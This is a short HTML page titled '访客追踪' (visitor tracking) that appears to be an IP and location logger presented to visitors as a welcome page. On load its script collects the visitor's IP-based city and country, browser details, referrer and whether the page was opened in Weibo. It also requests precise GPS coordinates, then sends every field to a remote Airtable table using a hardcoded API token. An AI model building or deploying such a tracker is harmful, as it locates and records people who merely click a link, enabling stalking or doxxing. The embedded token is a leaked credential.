<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>访客追踪</title>
</head>
<body>
  <h2>欢迎访问</h2>
  <div id="output">正在获取信息...</div>

  <script>
    async function getVisitorData() {
      const output = document.getElementById('output');

      // IP 信息
      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

      // 浏览器等信息
      const userAgent = navigator.userAgent;
      const language = navigator.language;
      const screenSize = `${screen.width}x${screen.height}`;
      const isFromWeibo = userAgent.includes('Weibo');
      const referrer = document.referrer || '无';
      const time = new Date().toISOString();

      // 定位
      let latitude = null, longitude = null, accuracy = null;
      let locationStr = '用户未授权位置';
      if ('geolocation' in navigator) {
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(
            pos => {
              latitude = pos.coords.latitude;
              longitude = pos.coords.longitude;
              accuracy = pos.coords.accuracy;
              locationStr = `纬度：${latitude}<br>经度：${longitude}<br>精度：${accuracy}米`;
              resolve();
            },
            err => {
              locationStr = '用户拒绝授权或位置获取失败';
              resolve();
            },
            { enableHighAccuracy: true, timeout: 5000 }
          );
        });
      }

      // 页面展示
      output.innerHTML = `
        <h3>访客信息：</h3>
        <p><strong>IP：</strong>${ipData.ip}</p>
        <p><strong>城市：</strong>${ipData.city}</p>
        <p><strong>国家：</strong>${ipData.country_name}</p>
        <p><strong>浏览器：</strong>${userAgent}</p>
        <p><strong>语言：</strong>${language}</p>
        <p><strong>屏幕：</strong>${screenSize}</p>
        <p><strong>是否微博打开：</strong>${isFromWeibo ? '是' : '否'}</p>
        <p><strong>来源：</strong>${referrer}</p>
        <p><strong>访问时间：</strong>${time}</p>
        <p><strong>位置：</strong><br>${locationStr}</p>
      `;

      // Airtable 上传
      const dataToSend = {
        records: [
          {
            fields: {
              IP: ipData.ip,
              City: ipData.city,
              Country: ipData.country_name,
              Browser: userAgent,
              Language: language,
              Screen: screenSize,
              From_Weibo_App: isFromWeibo ? 'Yes' : 'No',
              Referrer: referrer,
              VisitTime: time,
              Latitude: latitude || '',
              Longitude: longitude || '',
              Accuracy_m: accuracy || ''
            }
          }
        ]
      };

      // 信息：
      const token = 'patoKhBbgt8EdK21u.6b3caf8804a8678ea41f6812fb20ff48977fe72681a0bc9b65b9ecb98c7192f3'; // 
      const baseId = 'appxay6O2SXyiCXEq';       // 
      const tableName = 'Visitor Log';     // 

      // Airtable API 请求
      await fetch(`https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
      });
    }

    getVisitorData();
  </script>
</body>
</html>
